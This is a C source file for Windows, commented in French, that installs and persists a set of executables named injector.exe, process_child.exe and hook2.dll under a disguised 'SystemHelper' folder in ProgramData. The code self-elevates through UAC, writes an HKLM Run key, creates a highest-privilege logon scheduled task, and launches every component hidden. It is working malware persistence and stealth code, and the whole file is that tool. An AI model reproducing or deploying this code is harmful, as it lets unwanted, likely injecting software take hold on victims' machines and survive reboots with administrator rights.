#include <windows.h>
#include <shlobj.h>
#include <wchar.h>
#include <stdio.h>
#include <accctrl.h>
#include <aclapi.h>
#include <TlHelp32.h>

BOOL CreateFolderIfNotExist(LPCWSTR path) {
    if (CreateDirectoryW(path, NULL)) return TRUE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) return TRUE;
    return FALSE;
}

BOOL FileExists(LPCWSTR path) {
    DWORD attrs = GetFileAttributesW(path);
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL CopyFileToDestination(LPCWSTR sourcePath, LPCWSTR destPath) {
    return CopyFileW(sourcePath, destPath, FALSE);
}

BOOL SetHKLMRunEntry(LPCWSTR name, LPCWSTR command) {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return FALSE;

    BOOL success = (RegSetValueExW(hKey, name, 0, REG_SZ,
        (const BYTE*)command, (DWORD)((wcslen(command) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return success;
}

BOOL IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

BOOL RunAsAdmin(LPCWSTR processPath, LPCWSTR parameters) {
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = processPath;
    sei.lpParameters = parameters;
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (ShellExecuteExW(&sei)) {
        if (sei.hProcess) {
            WaitForSingleObject(sei.hProcess, 5000);
            CloseHandle(sei.hProcess);
        }
        return TRUE;
    }
    return FALSE;
}

BOOL RunProcessSilently(LPCWSTR processPath, LPCWSTR workingDir) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    WCHAR commandLine[MAX_PATH * 2];
    swprintf(commandLine, L"\"%s\"", processPath);

    BOOL success = CreateProcessW(NULL, commandLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, workingDir, &si, &pi);

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return success;
}

void CreateRunLog(LPCWSTR persistenceDir, LPCWSTR processName) {
    WCHAR logPath[MAX_PATH];
    swprintf(logPath, L"%s\\run_log.txt", persistenceDir);

    FILE* file = _wfopen(logPath, L"a");
    if (file) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fwprintf(file, L"[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, processName);
        fclose(file);
    }
}

BOOL CreateScheduledTask(LPCWSTR taskName, LPCWSTR executablePath) {
    HKEY hKey;
    LONG result;

    // Méthode 1: Registre Run (HKLM pour tous les utilisateurs)
    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);

    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, taskName, 0, REG_SZ,
            (const BYTE*)executablePath, (DWORD)((wcslen(executablePath) + 1) * sizeof(WCHAR)));
        RegCloseKey(hKey);

        if (result == ERROR_SUCCESS) {
            return TRUE;
        }
    }

    // Méthode 2: Tâche planifiée via schtasks
    WCHAR command[1024];
    swprintf(command,
        L"schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /rl highest /f",
        taskName, executablePath);

    DWORD exitCode = 0;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si = { sizeof(si) };

    if (CreateProcessW(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return (exitCode == 0);
    }

    return FALSE;
}

BOOL IsProcessRunning(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL found = FALSE;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return found;
}

BOOL IsInjectorRunning() {
    return IsProcessRunning(L"injector.exe");
}

BOOL IsProcessChildRunning() {
    return IsProcessRunning(L"process_child.exe");
}

BOOL IsResidentRunning() {
    return IsProcessRunning(L"resident.exe");
}

void WaitForSystemStartup() {
    Sleep(30000); // Réduit à 30 secondes

    // Attendre qu'Explorer.exe soit lancé
    for (int i = 0; i < 10; i++) {
        if (IsProcessRunning(L"explorer.exe")) {
            Sleep(10000); // 10 secondes supplémentaires après Explorer
            break;
        }
        Sleep(3000);
    }
}

// Fonction pour lancer tous les exécutables
void LaunchAllExecutables(LPCWSTR persistenceDir) {
    WCHAR injectorPath[MAX_PATH], processChildPath[MAX_PATH], residentPath[MAX_PATH];
    swprintf(injectorPath, L"%s\\injector.exe", persistenceDir);
    swprintf(processChildPath, L"%s\\process_child.exe", persistenceDir);
    swprintf(residentPath, L"%s\\resident.exe", persistenceDir);

    // Lancer resident.exe en premier (pour maintenir la persistence)
    if (!IsResidentRunning() && FileExists(residentPath)) {
        CreateRunLog(persistenceDir, L"lancement_resident");
        RunProcessSilently(residentPath, persistenceDir);
    }

    // Lancer injector.exe
    if (!IsInjectorRunning() && FileExists(injectorPath)) {
        CreateRunLog(persistenceDir, L"lancement_injector");
        RunProcessSilently(injectorPath, persistenceDir);

        // Attendre qu'injector.exe ait le temps de lancer process_child.exe
        Sleep(10000);
    }

    // Vérifier et lancer process_child.exe directement si nécessaire
    if (!IsProcessChildRunning() && FileExists(processChildPath)) {
        CreateRunLog(persistenceDir, L"lancement_direct_process_child");
        RunProcessSilently(processChildPath, persistenceDir);
    }

    // Vérification finale
    if (IsProcessChildRunning()) {
        CreateRunLog(persistenceDir, L"tous_processus_actifs");
    }
    else {
        CreateRunLog(persistenceDir, L"process_child_manquant");
    }
}

// Fonction pour supprimer les anciennes entrées de persistence
void CleanOldPersistenceEntries() {
    // Supprimer l'ancienne entrée registre
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, L"SystemHelper");
        RegCloseKey(hKey);
    }

    // Supprimer l'ancienne tâche planifiée
    WCHAR command[512];
    swprintf(command, L"schtasks /delete /tn \"SystemHelper\" /f");

    PROCESS_INFORMATION pi;
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WCHAR currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    WCHAR programData[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programData))) {
        return 1;
    }

    WCHAR persistenceDir[MAX_PATH];
    swprintf(persistenceDir, L"%s\\SystemHelper", programData);

    // MODE RÉSIDENT - Exécution après redémarrage
    if (wcsstr(currentExePath, persistenceDir) != NULL) {
        CreateRunLog(persistenceDir, L"resident_mode_detecte");

        // Nettoyer les anciennes entrées de persistence
        CleanOldPersistenceEntries();

        // Attendre que le système soit complètement démarré
        WaitForSystemStartup();

        // Vérifier que les fichiers nécessaires existent
        WCHAR injectorPath[MAX_PATH], processChildPath[MAX_PATH], hookDllPath[MAX_PATH], residentPath[MAX_PATH];
        swprintf(injectorPath, L"%s\\injector.exe", persistenceDir);
        swprintf(processChildPath, L"%s\\process_child.exe", persistenceDir);
        swprintf(hookDllPath, L"%s\\hook2.dll", persistenceDir);
        swprintf(residentPath, L"%s\\resident.exe", persistenceDir);

        BOOL filesExist = FileExists(injectorPath) &&
            FileExists(processChildPath) &&
            FileExists(hookDllPath) &&
            FileExists(residentPath);

        if (filesExist) {
            // Si nous ne sommes pas administrateur, relancer en admin
            if (!IsRunAsAdmin()) {
                CreateRunLog(persistenceDir, L"relance_en_admin");
                RunAsAdmin(residentPath, L"");
                return 0;
            }

            // Nous sommes administrateur - Lancer tous les exécutables
            CreateRunLog(persistenceDir, L"lancement_tous_executables");
            LaunchAllExecutables(persistenceDir);
        }
        else {
            CreateRunLog(persistenceDir, L"fichiers_manquants");
        }
        return 0;
    }

    // MODE INSTALLATION - Première exécution
    if (!IsRunAsAdmin()) {
        // Relancer en administrateur
        RunAsAdmin(currentExePath, L"");
        return 0;
    }

    // Nettoyer les anciennes installations
    CleanOldPersistenceEntries();

    if (!CreateFolderIfNotExist(persistenceDir)) {
        MessageBoxW(NULL, L"Erreur création dossier", L"Erreur", MB_ICONERROR);
        return 1;
    }

    // Obtenir le dossier actuel
    WCHAR currentDir[MAX_PATH];
    GetModuleFileNameW(NULL, currentDir, MAX_PATH);
    WCHAR* lastBackslash = wcsrchr(currentDir, L'\\');
    if (lastBackslash) *lastBackslash = L'\0';

    // Fichiers sources - TOUS les exécutables
    WCHAR injectorSource[MAX_PATH], processChildSource[MAX_PATH], hookDllSource[MAX_PATH], residentSource[MAX_PATH];
    swprintf(injectorSource, L"%s\\injector.exe", currentDir);
    swprintf(processChildSource, L"%s\\process_child.exe", currentDir);
    swprintf(hookDllSource, L"%s\\hook2.dll", currentDir);
    swprintf(residentSource, L"%s\\resident.exe", currentDir);

    // Vérifier l'existence de tous les fichiers
    if (!FileExists(injectorSource)) {
        MessageBoxW(NULL, L"injector.exe introuvable", L"Erreur", MB_ICONERROR);
        return 1;
    }
    if (!FileExists(processChildSource)) {
        MessageBoxW(NULL, L"process_child.exe introuvable", L"Erreur", MB_ICONERROR);
        return 1;
    }
    if (!FileExists(hookDllSource)) {
        MessageBoxW(NULL, L"hook2.dll introuvable", L"Erreur", MB_ICONERROR);
        return 1;
    }
    if (!FileExists(residentSource)) {
        MessageBoxW(NULL, L"resident.exe introuvable", L"Erreur", MB_ICONERROR);
        return 1;
    }

    // Chemins de destination
    WCHAR injectorDest[MAX_PATH], processChildDest[MAX_PATH], hookDllDest[MAX_PATH], residentDest[MAX_PATH];
    swprintf(injectorDest, L"%s\\injector.exe", persistenceDir);
    swprintf(processChildDest, L"%s\\process_child.exe", persistenceDir);
    swprintf(hookDllDest, L"%s\\hook2.dll", persistenceDir);
    swprintf(residentDest, L"%s\\resident.exe", persistenceDir);

    // Copie de TOUS les fichiers
    if (!CopyFileToDestination(injectorSource, injectorDest)) {
        MessageBoxW(NULL, L"Erreur copie injector.exe", L"Erreur", MB_ICONERROR);
        return 1;
    }
    if (!CopyFileToDestination(processChildSource, processChildDest)) {
        MessageBoxW(NULL, L"Erreur copie process_child.exe", L"Erreur", MB_ICONERROR);
        return 1;
    }
    if (!CopyFileToDestination(hookDllSource, hookDllDest)) {
        MessageBoxW(NULL, L"Erreur copie hook2.dll", L"Erreur", MB_ICONERROR);
        return 1;
    }
    // Se copier soi-même dans le dossier de persistence
    if (!CopyFileToDestination(currentExePath, residentDest)) {
        MessageBoxW(NULL, L"Erreur copie resident.exe", L"Erreur", MB_ICONERROR);
        return 1;
    }

    // Configuration de la persistence - UNIQUEMENT via tâche planifiée
    WCHAR cmdResident[MAX_PATH * 2];
    swprintf(cmdResident, L"\"%s\"", residentDest);

    if (!CreateScheduledTask(L"SystemHelper", residentDest)) {
        MessageBoxW(NULL, L"Erreur configuration persistence", L"Erreur", MB_ICONERROR);
        return 1;
    }

    // Test immédiat du système résident
    CreateRunLog(persistenceDir, L"installation_terminee");

    // Lancer tous les exécutables immédiatement après installation
    CreateRunLog(persistenceDir, L"lancement_immediat");
    LaunchAllExecutables(persistenceDir);

    // Lancer le système résident
    if (RunProcessSilently(residentDest, persistenceDir)) {
        MessageBoxW(NULL,
            L"Installation réussie!\n\n"
            L"Le système est maintenant résident et se relancera automatiquement:\n"
            L"• Après chaque redémarrage\n"
            L"• Avec les privilèges administrateur\n"
            L"• Tous les exécutables seront lancés automatiquement\n\n"
            L"Redémarrez votre ordinateur pour tester la persistence.",
            L"Installation Réussie",
            MB_ICONINFORMATION);
    }
    else {
        MessageBoxW(NULL,
            L"Installation terminée mais échec du test.\n"
            L"Le système pourrait ne pas être résident.",
            L"Avertissement",
            MB_ICONWARNING);
    }

    return 0;
}